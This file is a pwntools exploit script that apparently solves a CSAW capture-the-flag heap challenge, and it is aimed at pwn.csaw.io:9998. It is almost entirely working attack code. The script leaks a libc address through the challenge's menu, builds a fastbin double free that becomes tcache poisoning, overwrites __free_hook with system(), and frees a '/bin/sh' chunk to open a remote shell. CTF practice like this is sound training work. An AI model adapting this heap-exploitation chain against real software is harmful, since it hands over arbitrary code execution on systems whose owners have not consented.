#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=pwn.csaw.io' '--port=9998' super_secure_heap_patched
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'super_secure_heap_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'pwn.csaw.io'
port = int(args.PORT or 9998)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'.'



def malloc_keys(size):
    io.sendline(b"1")
    io.sendline(b"1")
    io.sendline(f"{size}".encode())

def malloc_content(size):
    io.sendline(b"2")
    io.sendline(b"1")
    io.sendline(f"{size}".encode())

def free_keys(idx):
    io.sendline(b"1")
    io.sendline(b"2")
    io.sendline(f"{idx}".encode())

def free_content(idx):
    io.sendline(b"2")
    io.sendline(b"2")
    io.sendline(f"{idx}".encode())

def edit_keys(idx,size,content):
    io.sendline(b"1")
    io.sendline(b"3")
    io.sendline(f"{idx}".encode())
    io.sendline(f"{size}".encode())
    io.sendline(content)

def show_content(idx):
    io.sendline(b"2")
    io.sendline(b"4")
    io.sendline(f"{idx}".encode())
def show_keys(idx):
    io.sendline(b"1")
    io.sendline(b"4")
    io.sendline(f"{idx}".encode())

io = start()

for i in range(10):
    malloc_content(104)
for i in range(7):
    free_content(i)

malloc_keys(24) # 0 
#leak libc
malloc_keys(1280)#1
malloc_keys(200) #2
malloc_keys(200)#3
free_keys(1)
malloc_keys(1280)#1
#double free on fasbins
free_content(7)
free_content(8)
free_content(7) 
#leak libc and setting the base 
show_keys(1)
io.recvuntil(b"content: \n")
leak = io.recvuntil(b"Do" , drop = True)
leak = u64(leak.ljust(8,b"\x00"))- 0x1ecbe0 
info(f"leak libc : {hex(leak)}")
libc = exe.libc
libc.address = leak
#clearing
free_keys(0)
free_keys(1)
free_keys(2)
free_keys(3)
for i in range(2):
    malloc_content(104)
for i in range(5): 
    malloc_keys(104) # 0-4 realloco la tcache
# here we have the double free on FASTBIN with empty tcache
malloc_keys(104) #5 # this malloc alloc the first fasbin chunk and copys the others fastbins into the tcache
#and now we have the double free on tcache 
edit_keys(5,103,p64(libc.sym.__free_hook))
malloc_keys(104) #6

malloc_keys(104)#7
malloc_keys(104)#8
edit_keys(8,103,p64(libc.sym.system))
edit_keys(7,103,b"/bin/sh\x00")
free_keys(7)

# content ->  uaf -> secure del cazzo

# keys -> no uaf  -> no secure del cazzo
io.interactive()

